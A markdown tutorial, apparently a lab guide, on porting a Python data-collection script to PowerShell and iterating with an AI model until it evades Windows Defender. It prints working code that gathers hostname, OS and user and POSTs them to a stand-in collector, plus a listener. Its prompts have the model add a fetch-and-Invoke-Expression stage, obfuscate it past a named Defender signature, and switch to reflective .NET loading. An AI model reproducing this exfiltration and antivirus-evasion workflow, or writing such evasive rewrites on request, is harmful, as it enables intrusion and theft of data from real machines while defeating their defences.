# Port a Python PoC to PowerShell and Evade Defender

<img width="1376" height="768" alt="image" src="https://github.com/user-attachments/assets/f0ca94a6-aca3-4e35-8c3e-48627ac973db" />

## Step 1
Their python POC
```
import base64
import urllib.request
import subprocess
import platform

def gather():
    info = {
        "host": platform.node(),
        "os": platform.platform(),
        "user": subprocess.check_output(["whoami"], text=True).strip(),
    }
    return info

def exfil(data, url):
    payload = base64.b64encode(str(data).encode()).decode()
    req = urllib.request.Request(url, data=payload.encode(), method="POST")
    urllib.request.urlopen(req, timeout=5)

if __name__ == "__main__":
    info = gather()
    exfil(info, "http://your-collector.example/log")
    print("done")
```

## Step 2:
Ask the model to port it:
```
Port this Python PoC to PowerShell. Keep the same three fields. Use Invoke-WebRequest for the POST. Do not add features. Do not remove features. Give me the .ps1 file contents.
[paste the Python source]
```
The return could look like this:
```
$info = @{
    host = $env:COMPUTERNAME
    os   = (Get-CimInstance Win32_OperatingSystem).Caption
    user = whoami
}
$payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($info | ConvertTo-Json)))
Invoke-WebRequest -Uri 'http://your-collector.example/log' -Method Post -Body $payload
Write-Host 'done'
```


Setup simple collector
```
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length)
        print(data.decode())
        self.send_response(200)
        self.end_headers()
HTTPServer(('0.0.0.0', 8888), H).serve_forever()
"
```
Remember its on port 8888

## Step 3
Run the baseline on target:
```
powershell -ExecutionPolicy Bypass -File port.ps1
```

Prompt AI for defender to flag:
```
**Add a step to the PowerShell version that fetches a base64 string from http://your-collector.example/stage and executes it with Invoke-Expression. Keep the same three fields.**
```
Command string
```
Get-MpThreatDetection | Select-Object ThreatName, Resources -First 1
```

## Step 4:
Iterate obfuscation with the model
```
Windows Defender flagged the previous script as HackTool:PowerShell/DownloadIEX. Rewrite the same functionality so it does not trip this signature. Do not use Invoke-Expression or IEX. Replace the download step with [System.Net.WebClient] or [System.Net.Http.HttpClient]. Keep the three fields and the POST exfiltration using Invoke-WebRequest.
```
## Step 5:
Confirm payload runs clean and pray to god:
```
Get-MpThreatDetection | Select-Object -First 5
```
The list should not be in your payload

### Confirming completion

*   Baseline Python PoC saved and understood
*   Model-generated PowerShell port runs on the target
*   One iteration flagged by Defender with the signature name recorded
*   Final iteration runs with no Defender flag
*   Every version saved for the evasion playbook

### Troubleshooting

**Defender does not flag any version.**  
Server 2025 Defender is less aggressive on some signatures than Windows 11. Adjust the payload to include a stronger trigger. Ask the model for a version with an inline Metasploit-style stub. That will flag.

**The model keeps giving the same rewrite.**  
Change temperature. In Open WebUI, open the model settings and raise temperature to 0.9. Ask again. The rewrites diverge.

**The script runs but the collector never receives data.**  
Check `Test-NetConnection your-collector.example -Port 80` on the target. Corporate firewalls on the target may block outbound.

**Defender log is empty.**  
Alerts sync with the cloud on a delay. Run `Get-MpThreatDetection` again after 30 seconds.

**Defender keeps flagging after five rounds of rewrites.**  
Ask the model to change the approach entirely rather than iterating on the same pattern. Prompt: "Stop modifying the download-and-execute pattern. Write the payload as a .NET assembly loaded via reflection. Avoid Invoke-Expression entirely."

